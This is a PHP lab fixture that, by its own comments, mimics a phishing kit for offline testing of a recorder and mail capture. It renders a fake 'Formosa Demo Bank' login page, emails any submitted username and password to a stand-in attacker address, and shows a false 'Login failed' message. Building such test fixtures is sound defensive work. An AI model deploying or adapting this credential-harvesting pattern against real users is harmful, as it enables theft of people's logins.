<?php
// LAB SELF-TEST "kit" - NOT a real phishing kit. A Formosa-style login that posts to itself and
// "exfils" the submitted credentials by EMAIL to a CONFIGURABLE address (mirroring DynaPD's
// de-weaponized email exfil), so we can validate the recorder + mail capture offline, with fake
// data only, before ever touching a real kit.
$exfil_to = getenv('QG_EXFIL_EMAIL') ?: 'attacker@phishing.localhost';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = $_POST['username'] ?? '';
    $p = $_POST['password'] ?? '';
    mail($exfil_to, 'creds', "stolen username=$u password=$p");  // captured by sendmail_path, never sent
    echo "<p>Login failed, please try again.</p>";
}
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Formosa Demo Bank</title></head>
<body>
  <h1>Formosa Demo Bank</h1>
  <form method="post">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Sign in</button>
  </form>
</body></html>
